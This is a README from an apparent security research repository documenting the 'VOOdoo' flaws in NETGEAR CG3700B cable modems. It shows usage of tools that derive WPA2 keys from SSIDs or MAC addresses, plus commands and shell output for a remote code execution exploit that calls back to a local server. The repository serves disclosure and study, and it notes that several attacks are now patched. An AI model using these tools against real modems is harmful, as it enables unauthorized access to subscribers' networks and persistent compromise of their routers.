# VOOdoo - Research Notes

![lol](voodoo_logo.png)

This repository holds proof-of-concepts for the VOOdoo vulnerabilities found in NETGEAR CG3700B cable modems provided by VOO to its subscribers.

These modems use a weak algorithm to generate WPA2 pre-shared keys, allowing an attacker in reception range of a vulnerable modem to derive the WPA2 pre-shared key from the access point MAC address. The modems are also vulnerable to remote code execution through the web administration panel. The exploit is possible due to usage of default credentials and programming errors in multiple form handlers.

By chaining these vulnerabilities an attacker can gain unauthorized access to VOO customers LAN (over the Internet or by being in reception range of the access point), fully compromise the router, and leave a persistent backdoor allowing direct remote access to the network.

### SSID generator

Generate SSID from MAC address similarly to Netgear CG3700B devices.

```
python3 genssid.py a4:2b:8c:a0:c0:b8
VOO-984071
```

### WPA2 PSK Generator

The *wifi/brutepsk.py* script will generate a list of valid WPA2 PSK candidates by using
a list of observed Netgear OUIs in Wigle and validating them by using the provided
SSID as an oracle.

With the current list, you'll get around 120 candidates for a given SSID.

```
time python3 brutepsk.py VOO-984071
--snip--
[+] Potential candidate found (MAC: 0x001E2AFE426B) - PXBXLGRG
[+] Potential candidate found (MAC: 0x001E2AFEA994) - XXDOHLZZ
[+] Potential candidate found (MAC: 0x001F330498FC) - DOPZHBPA
--snip--
python3 brutepsk.py VOO-984071  285,18s user 0,03s system 99% cpu 4:45,26 total
```

### Network Sniffer with Automatic PSK Guesser

**This no longer works since the patch rollout**

You need to put your wireless interface in monitor mode and start scanning for devices around you using airodump:

```
sudo airmon-ng wlp6s
sudo airodump-ng -i wlp6s0mon
```

While doing so, launch the sniffer script and it will list vulnerable access points:

```
sudo python sniffer.py
AP MAC: 20:0c:c8:16:76:dc with SSID: VOO-111317 (PSK: VNCKUFXQ)
```

### Remote Command Execution (local network)

The callback is made to 192.168.100.2 so you need to set that address explicitly:

```
ip addr add 192.168.100.2/24 dev eno1
ip r add 192.168.100.1 dev eno1 src 192.168.100.2
```

Launch the callback server:

```
python2.7 server.py
```

Run the exploit:

```
python2.7 -W ignore exploit.py
[+] Loading anti-csrf token
[+] Got anti-csrf token (1756101231)
[+] Triggering exploit.
```

If everything worked as expected:

```
python2.7 server.py 
[+] Trying to bind to 0.0.0.0 on port 5504: Done
[+] Waiting for connections on 0.0.0.0:5504: Got connection from 192.168.100.1 on port 1024
[+] Got connection. Sending payload.
[*] Switching to interactive mode
$ help
!               ?               REM             call            cd             
dir             find_command    help            history         instances      
ls              man             pwd             sleep           syntax         
system_time     usage           
----
ClearCmCert     binarySfid      bpiShow         cfg_hex_show    cfg_tlv_show   
ch_state        clear_image     cm_ctrl         comp_mac_to_phy comp_phy_to_mac
copy_image      dbc_msg_inject  dload           dsdiag          dsx_show       
event_censor    goto_ds         goto_us         igmpShow        ip_initialize  
ip_show         l2vpn_show      link_state      log_messages    map_debug      
mdd_modify      mdd_sets_show   modem_caps      nrg_mgmt        
override_ucd_max_burst          publish_event   rate_shaping_enable            
reseq_dsid_regress_test         rng_rsp         scan_stop       showFlows      
state           stop_download   ucdShow         ucddiag         up_dis         
us_phy_oh_show  us_target_mset  usdiag          
----
[dsxTest] [propane_ctl] 
```

### Remote Command Execution (Internet)

**This no longer works over the Internet since VOO applied mitigations (disabling UPnP, filtering DNS rebinding).** 

However, everything is available in index.html, and exploit.js if you want to study the code.


## Video Demo

![rce demo](voodoo_rce_demo.mp4)

## References

- VOOdoo - Remotely Compromising VOO Cable Modems - [https://quentinkaiser.be/security/2021/03/09/voodoo/](https://quentinkaiser.be/security/2021/03/09/voodoo/)
